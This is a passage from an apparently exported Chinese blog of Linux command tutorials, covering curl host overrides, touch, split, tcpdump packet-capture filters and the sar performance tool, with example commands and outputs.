实例19：在linux上使用curl访问网站，指定主机IP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux的命令窗口下，无法使用浏览器去浏览网站，但是可以用curl访问html代码。有时，为了指定某个域名的IP，需要写hosts，比较费事。可以临时用curl命令指定一个IP 1curl www.example.com -x192.168.0.111:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 -x 选项指定主机IP，这种方法类似与IE设置了一个代理服务器。但有时候（访问https时）这样访问不太好用，可以使用： 1curl -H "Host:www.abc.com" https://192.168.0.111/aaa.txt]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- touch]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F7.%20Linux%20%E5%91%BD%E4%BB%A4-%20touch%2F</url>
    <content type="text"><![CDATA[Linux 命令- touch&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux的touch命令不常用，一般在使用make的时候可能会用到，用来修改文件时间戳，或者新建一个不存在的文件。 1．命令格式：1touch [选项] [文件] 2．命令参数： -a 或–time=atime或–time=access或–time=use 只更改存取时间。 -c 或–no-create 不建立任何文档。 -d 使用指定的日期时间，而非现在的时间。 -f 此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题。 -m&amp; 或–time=mtime或–time=modify 只更改变动时间。 -r 把指定文档或目录的日期时间，统统设成和参考文档或目录的日期时间相同。 -t 使用指定的日期时间，而非现在的时间。 3．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;touch命令参数可更改文档或目录的日期时间，包括存取时间和更改时间。 4．使用范例：实例1：创建不存在的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch log2012.log log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 1234[root@localhost test]# touch log2012.log log2013.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果log2014.log不存在，则不创建文件 1234[root@localhost test]# touch -c log2014.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log 实例2：更新log.log的时间和log2012.log时间戳相同&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch -r log.log log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 16:01 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log[root@localhost test]# touch -r log.log log2012.log [root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log 实例3：设定文件的时间戳&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1touch -t 201211142234.50 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log[root@localhost test]# touch -t 201211142234.50 log.log[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log2012.log-rw-r--r-- 1 root root 0 10-28 16:01 log2013.log-rw-r--r-- 1 root root 0 2012-11-14 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-t time 使用指定的时间值 time 作为指定文件相应时间戳记的新值．此处的 time规定为如下形式的十进制数: 1[[CC]YY]MMDDhhmm[.SS] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里，CC为年数中的前两位，即”世纪数”；YY为年数的后两位，即某世纪中的年数．如果不给出CC的值，则touch 将把年数CCYY限定在1969–2068之内．MM为月数，DD为天将把年数CCYY限定在1969–2068之内．MM为月数，DD为天数，hh 为小时数(几点)，mm为分钟数，SS为秒数．此处秒的设定范围是0–61，这样可以处理闰秒．这些数字组成的时间是环境变量TZ指定的时区中的一个时 间．由于系统的限制，早于1970年1月1日的时间是错误的。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- split]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F69.%20Linux%20%E5%91%BD%E4%BB%A4-%20split%2F</url>
    <content type="text"><![CDATA[Linux 命令- split&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;split 命令用于将一个文件分割成数个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该指令将大文件分割成较小的文件，在默认情况下将按照每1000行割成一个小文件。 1. 命令语法1split [参数] [要切割的文件] [输出文件名] 2. 命令参数 &lt;行数&gt; : 指定每多少行切成一个小文件 -b&lt;字节&gt; : 指定每多少字节切成一个小文件 –help : 在线帮助 –version : 显示版本信息 -C&lt;字节&gt; : 与参数”-b”相似，但是在切 割时将尽量维持每行的完整性 [输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号 3. 使用实例实例1：使用 split 将文件 README 每6行切割成一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1split -6 README &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123$ split -6 README$ ls README xaa xad xag xab xae xah xac xaf xai &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 split 不指定目标文件名，则会以 xaa、xab……这样的文件名来存取切割后的文件，也可以指定文件名。 实例2：使用 split 将文件 README 以每500字节切割&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1split -b500 README &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123$ split -b500 README$ ls README xaa xad xag xab xae xah xac xaf xai]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- tcpdump]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F79.%20Linux%20%E5%91%BD%E4%BB%A4-%20tcpdump%2F</url>
    <content type="text"><![CDATA[Linux 命令- tcpdump&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tcpdump是一个用于截取网络分组，并输出分组内容的工具。tcpdump凭借强大的功能和灵活的截取策略，使其成为类UNIX系统下用于网络分析和问题排查的首选工具。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tcpdump提供了源代码，公开了接口，因此具备很强的可扩展性，对于网络维护和入侵者都是非常有用的工具。tcpdump存在于基本的Linux系统中，由于它需要将网络界面设置为混杂模式，普通用户不能正常执行，但具备root权限的用户可以直接执行它来获取网络上的信息。因此系统中存在网络分析工具主要不是对本机安全的威胁，而是对网络上的其他计算机的安全存在威胁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候也许有这样的需求，想看一下某个网卡上都有哪些数据包，尤其是当初判定服务器上有流量攻击。这时使用tcpdump来抓一下数据包，就可以知道有哪些IP在攻击了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果系统没有tcpdump这个命令需要用yum安装一下。 1yum install -y tcpdump 命令格式1tcpdump [-nn] [-i 接口] [-w 存储档名] [-c 次数] [-Ae] [-qX] [-r 文件] [所欲捕获的数据内容] 命令参数 -A 以ASCII格式打印出所有分组，并将链路层的头最小化。 -c 在收到指定的数量的分组后，tcpdump就会停止。 -C 在将一个原始分组写入文件之前，检查文件当前的大小是否超过了参数file_size 中指定的大小。如果超过了指定大小，则关闭当前文件，然后在打开一个新的文件。参数 file_size 的单位是兆字节（是1,000,000字节，而不是1,048,576字节）。 -d 将匹配信息包的代码以人们能够理解的汇编格式给出。 -dd 将匹配信息包的代码以c语言程序段的格式给出。 -ddd 将匹配信息包的代码以十进制的形式给出。 -D 打印出系统中所有可以用tcpdump截包的网络接口。 -e 在输出行打印出数据链路层的头部信息。 -E 用spi@ipaddr algo:secret解密那些以addr作为地址，并且包含了安全参数索引值spi的IPsec ESP分组。 -f 将外部的Internet地址以数字的形式打印出来。 -F 从指定的文件中读取表达式，忽略命令行中给出的表达式。 -i 指定监听的网络接口。 -l 使标准输出变为缓冲行形式，可以把数据导出到文件。 -L 列出网络接口的已知数据链路。 -m 从文件module中导入SMI MIB模块定义。该参数可以被使用多次，以导入多个MIB模块。 -M 如果tcp报文中存在TCP-MD5选项，则需要用secret作为共享的验证码用于验证TCP-MD5选选项摘要（详情可参考RFC 2385）。 -b 在数据-链路层上选择协议，包括ip、arp、rarp、ipx都是这一层的。 -n 不把网络地址转换成名字。 -nn 不进行端口名称的转换。 -N 不输出主机名中的域名部分。例如，‘nic.ddn.mil‘只输出’nic‘。 -t 在输出的每一行不打印时间戳。 -O 不运行分组分组匹配（packet-matching）代码优化程序。 -P 不将网络接口设置成混杂模式。 -q 快速输出。只输出较少的协议信息。 -r 从指定的文件中读取包(这些包一般通过-w选项产生)。 -S 将tcp的序列号以绝对值形式输出，而不是相对值。 -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 -T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc远程过程调用）和snmp（简单网络管理协议；）。 -t 不在每一行中输出时间戳。 -tt 在每一行中输出非格式化的时间戳。 -ttt 输出本行和前面一行之间的时间差。 -tttt 在每一行中输出由date处理的默认格式的时间戳。 -u 输出未解码的NFS句柄。 -v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息。 -vv 输出详细的报文信息。 -w 直接将分组写入文件中，而不是不分析并打印出来。 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;顾名思义，tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。他支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。 tcpdump的表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表达式是一个正则表达式，tcpdump利用它作为过滤报文的条件，如果一个报文满足表 达式的条件，则这个报文将会被捕获。如果没有给出任何条件，则网络上所有的信息包 将会被截获。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在表达式中一般如下几种类型的关键字： 第一种是关于类型的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括host、net、prot，例如host 210.27.48.2 ，指明210.27.48.2是一台主机，net202.0.0.0指明202.0.0.0是一个网络地址，port 23 指明端口号是23.如果没有指定类型，缺省的类型是host。 第二种是确定传输方向的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括src、dst、dst or src、dst and src，这些关键字指明了传输的方向。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;举例说明，src 210.27.48.2，指明ip包中源地址是210.27.48.2，dst net 202.0.0.0指明目的网络地址是202.0.0.0.如果没有指明方向关键字，则缺省是src or dst关键字。 第三种是协议的关键字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主要包括fddi、ip、arp、rarp、tcp、udp等类型。fddi指明是在FDDI（分布式光纤数据接口网络）上的特定的网络协议，实际上它是“ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether包进行处理和分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了这三种类型的关键字之外，其他重要的关键字如下：gateway、breadcast、less、greater，还有三种逻辑运算，取非运算是‘not’ ‘!’，与运算是‘and’，‘&amp;&amp;’；或运算是‘or’，‘&amp;#124；……#124;’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。 输出结果介绍数据链路层头信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump --e host localhost &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;localhost 是一台linux主机。它的MAC地址是0：90：27：58：AF：1A H219是一台装有Solaris的SUN工作站。它的MAC地址是8：0：20：79：5B：46； 上一条命令的输出结果如下所示： 121:50:12.847509 eth0 &lt; 8:0:20:79:5b:46 0:90:27:58:af:1a ip 60: h219.33357 &gt; ICE. telne t 0:0(0) ack 22535 win 8760 (DF) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;21：50：12是显示的时间， 847509是ID号，eth0 &lt;表示从网络接口eth0接收该分组， eth0 &gt;表示从网络接口设备发送分组， 8:0:20:79:5b:46是主机H219的MAC地址， 它表明是从源地址H219发来的分组. 0:90:27:58:af:1a是主机ICE的MAC地址， 表示该分组的目的地址是ICE。 ip 是表明该分组是IP分组，60 是分组的长度， h219.33357 &gt; ICE. telnet 表明该分组是从主机H219的33357端口发往主机ICE的 TELNET(23)端口。 ack 22535 表明对序列号是222535的包进行响应。 win 8760表明发 送窗口的大小是8760。 ARP包的tcpdump输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump arp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出结果 1222:32:42.802509 eth0 &gt; arp who-has route tell ICE (0:90:27:58:af:1a)22:32:42.802902 eth0 &lt; arp reply route is-at 0:90:27:12:10:66 (0:90:27:58:af:1a) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;22:32:42是时间戳， 802509是ID号， eth0 &gt;表明从主机发出该分组，arp表明是ARP请求包， who-has route tell ICE表明是主机ICE请求主机route的MAC地址。 0:90:27:58:af:1a是主机 ICE的MAC地址。 TCP包的输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用tcpdump捕获的TCP包的一般输出信息是： 1src &gt; dst: flags data-seqno ack window urgent options &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;src &gt; dst:表明从源地址到目的地址， flags是TCP报文中的标志信息，S 是SYN标志， F (FIN)， P (PUSH) ， R (RST) “.” (没有标记); data-seqno是报文中的数据 的顺序号， ack是下次期望的顺序号， window是接收缓存的窗口大小， urgent表明 报文中是否有紧急指针。 Options是选项。 UDP包的输出信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用tcpdump捕获的UDP包的一般输出信息是： 1route.port1 &gt; ICE.port2: udp lenth &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;UDP十分简单，上面的输出行表明从主机route的port1端口发出的一个UDP报文 到主机ICE的port2端口，类型是UDP， 包的长度是lenth。 使用实例实例1：默认启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455[root@localhost ~]# tcpdumptcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes12:53:58.186853 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2571645771:2571645967, ack 2817097466, win 141, length 19612:53:58.187498 IP 192.168.0.73.43721 &gt; www.routerlogin.com.domain: 13011+ PTR? 100.0.168.192.in-addr.arpa. (44)12:53:58.193280 IP www.routerlogin.com.domain &gt; 192.168.0.73.43721: 13011 NXDomain* 0/1/0 (93)12:53:58.193391 IP 192.168.0.73.54701 &gt; www.routerlogin.com.domain: 55618+ PTR? 73.0.168.192.in-addr.arpa. (43)12:53:58.198669 IP www.routerlogin.com.domain &gt; 192.168.0.73.54701: 55618 NXDomain* 0/1/0 (92)12:53:58.198775 IP 192.168.0.73.39373 &gt; www.routerlogin.com.domain: 10426+ PTR? 1.0.168.192.in-addr.arpa. (42)12:53:58.200468 IP www.routerlogin.com.domain &gt; 192.168.0.73.39373: 10426- 1/0/0 PTR www.routerlogin.com. (75)12:53:58.200515 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 196:376, ack 1, win 141, length 18012:53:58.200595 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 376, win 256, length 012:53:58.208513 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 376:1276, ack 1, win 141, length 90012:53:58.224403 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1276:1440, ack 1, win 141, length 16412:53:58.224597 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 1440, win 252, length 012:53:58.239996 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1440:1700, ack 1, win 141, length 26012:53:58.255361 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1700:1864, ack 1, win 141, length 16412:53:58.255508 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 1864, win 256, length 012:53:58.271142 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 1864:2124, ack 1, win 141, length 26012:53:58.286589 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2124:2288, ack 1, win 141, length 16412:53:58.286754 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 2288, win 254, length 012:53:58.286912 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2288:2548, ack 1, win 141, length 26012:53:58.302161 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2548:2712, ack 1, win 141, length 16412:53:58.302377 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 2712, win 253, length 012:53:58.302462 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2712:2972, ack 1, win 141, length 26012:53:58.317893 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 2972:3136, ack 1, win 141, length 16412:53:58.318078 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3136, win 251, length 012:53:58.318149 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3136:3300, ack 1, win 141, length 16412:53:58.333352 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3300:3560, ack 1, win 141, length 26012:53:58.333507 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3560, win 256, length 012:53:58.348907 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3560:3820, ack 1, win 141, length 26012:53:58.366358 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3820:3984, ack 1, win 141, length 16412:53:58.366514 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 3984, win 254, length 012:53:58.381239 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 3984:4244, ack 1, win 141, length 26012:53:58.396759 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4244:4408, ack 1, win 141, length 16412:53:58.396965 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 4408, win 253, length 012:53:58.412465 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4408:4668, ack 1, win 141, length 26012:53:58.428078 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4668:4832, ack 1, win 141, length 16412:53:58.428276 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 4832, win 251, length 012:53:58.443786 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 4832:5092, ack 1, win 141, length 26012:53:58.459211 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5092:5256, ack 1, win 141, length 16412:53:58.459444 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 5256, win 256, length 012:53:58.474768 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5256:5516, ack 1, win 141, length 26012:53:58.490445 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5516:5680, ack 1, win 141, length 16412:53:58.490611 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 5680, win 254, length 012:53:58.490693 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5680:5940, ack 1, win 141, length 26012:53:58.490904 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 5940:6104, ack 1, win 141, length 16412:53:58.491013 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [.], ack 6104, win 253, length 012:53:58.506024 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 6104:6364, ack 1, win 141, length 26012:53:58.516922 IP 192.168.0.100.49602 &gt; 192.168.0.73.ssh: Flags [P.], seq 1:53, ack 6364, win 252, length 5212:53:58.517035 IP 192.168.0.73.ssh &gt; 192.168.0.100.49602: Flags [P.], seq 6364:6528, ack 53, win 141, length 164^C48 packets captured51 packets received by filter0 packets dropped by kernel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;普通情况下，直接启动tcpdump将监视第一个网络接口上所有流过的数据包 实例2：监视指定网络接口的数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -i eth1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0。 实例3：以IP与port number抓下eth0这个网卡上 使得数据包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -i eth0 -nn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021[root@localhost ~]# tcpdump -nn -i eth0tcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes13:00:35.277585 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 2573734647:2573734843, ack 2817100566, win 141, length 19613:00:35.277769 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 196, win 252, length 013:00:35.292177 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 196:472, ack 1, win 141, length 27613:00:35.307810 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 472:636, ack 1, win 141, length 16413:00:35.308018 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 636, win 251, length 013:00:35.338945 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 636:896, ack 1, win 141, length 26013:00:35.340898 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 896:1060, ack 1, win 141, length 16413:00:35.341088 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 1060, win 256, length 013:00:35.356706 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1060:1320, ack 1, win 141, length 26013:00:35.356935 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1320:1484, ack 1, win 141, length 16413:00:35.357059 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [.], ack 1484, win 254, length 013:00:35.372128 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1484:1744, ack 1, win 141, length 26013:00:35.382482 IP 192.168.0.100.49602 &gt; 192.168.0.73.22: Flags [P.], seq 1:53, ack 1744, win 253, length 5213:00:35.382649 IP 192.168.0.73.22 &gt; 192.168.0.100.49602: Flags [P.], seq 1744:2020, ack 53, win 141, length 276^C14 packets captured14 packets received by filter0 packets dropped by kernel &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第三列和第四列显示的信息为哪一个IP+port 在连接哪一个IP+port，后面的信息是该数据包的相关信息。这里需要关注的只是第三列以及第四列。-i选项后面跟设备名称，如果想抓其他网卡的包，后面则要跟其他网卡名。至于-nn选项是作用是让第三列和第四列西安市城IP+端口号的形式，如果不加-nn则显示的是主机名+服务名称。 实例4：截获所有210.27.48.1的主机收到的和发出的所有的数据&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump host 210.27.48.1 实例5：截获主机210.24.48.1和主机210.24.48.2或210.27.48.3的通信&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump host 210.2748.1 and 210.27.48.2 or 210.27.48.3 实例6：获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump ip host 210.27.48.1 and ! 210.27.48.2 实例7：获取主机192.168.228.246接收或发出的ssh包，并且不转换主机名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -nn -n src host 192.168.228.246 and port 22 and tcp 实例8：获取主机192.168.228.246接收或发出的ssh包，并把mac地址也一同显示&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -e src host 192.168.228.246 and port 22 and tcp -n -nn 实例9：过滤的是源主机为192.168.0.1与目的网路哦为192.168.0.0的报头&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump src host 192.168.0.1 and dst net 192.168.0.0/24 实例10：过滤源主机物理地址为XXX的报头&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump ether src 00:50:04:BA:98 and dst…… &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ether src后面没有host或者net，物理地址当然不可能有网络。 实例11：过滤源主机192.168.0.1和目的端口不是telnet的报头，并导入到test.txt文件中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump src host 192.168.0.1 and dst port not telnet -l &gt; test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ip、icmp、arp、rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型。 实例12：捕获192.168.1.100主机eth1网卡上80端口接收和发出的数据100条，并保存文件1.cap&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1tcpdump -nn -i eth1 host 192.168.1.100 and port 80 -c 100 -w 1.cap &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用host指定ip，port指定端口，-c指定包数量，-w写入指定文件里。而不加 -w直接在屏幕上显示的不是数据包，而是数据流向。这个1.cap可以下载到windows上，谈后用wireshark查看。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- sar]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F78.Linux%20%E5%91%BD%E4%BB%A4-%20sar%2F</url>
    <content type="text"><![CDATA[Linux 命令- sar&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar（System ActivityReporter系统活动情况报告）是目前Linux上最为全面的系统性能分析工具之一，可以从多方面对系统的活动进行报告，包括：文件的读写情况、系统调用的使用情况、磁盘I/O、CPU效率、内存使用状况、进程活动及IPC有关的活动等。它不同于其他系统状态监控工具的地方在于，它可以打印历史信息，可以显示当天从零点开始到当前时刻的系统状态信息。如果你系统没有安装这个命令，请使用 yum install -y sysstat 命令安装。初次使用sar命令会报错，那是因为sar工具还没有生成相应的数据库文件（时时监控就不会了，因为不用去查询那个库文件）。它的数据库文件在 “/var/log/sa/” 目录下，默认保存一个月。 命令格式1sar [选项] [时间间隔] [次数] 命令选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sar命令的选项很多，下面只列出常用选项： -A:所有报告的总和 -b:显示I/O和传递速率的统计信息 -B:显示换页状态 -d:输出每一块磁盘的使用信息 -e:设置显示报告的结束时间 -f:从制定的文件读取报告 -i:设置状态信息刷新的间隔时间 -P:报告每个CPU的状态 -R:显示内存状态 –u:输出cpu使用情况和统计信息 –v:显示索引节点、文件和其他内核表的状态 -w:显示交换分区的状态 -x:显示给定进程的装 -r:报告内存利用率的统计信息 使用实例实例1：统计CPU的使用情况，每间隔1秒钟统计一次，总共统计三次&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -u 1 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost ~]# sar -u 1 3Linux 2.6.32-431.el6.x86_64 (localhost) 2017年07月12日 _x86_64_ (4 CPU)13时27分59秒 CPU %user %nice %system %iowait %steal %idle13时28分00秒 all 0.00 0.00 0.50 0.00 0.00 99.5013时28分01秒 all 0.00 0.00 0.25 0.00 0.00 99.7513时28分02秒 all 0.25 0.00 1.00 0.50 0.00 98.26平均时间: all 0.08 0.00 0.58 0.17 0.00 99.17 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 #%user #用户空间的CPU使用 #%nice 改变过优先级的进程的CPU使用率 #%system 内核空间的CPU使用率 #%iowait CPU等待IO的百分比 #%steal 虚拟机的虚拟机CPU使用的CPU #%idle 空闲的CPU &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在以上的显示当中，主要看%iowait和%idle，%iowait过高表示存在I/O瓶颈，即磁盘IO无法满足业务需求，如果%idle过低表示CPU使用率比较严重，需要结合内存使用等情况判断CPU是否瓶颈。 实例2：每个CPU的使用状态&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1sar -p 1 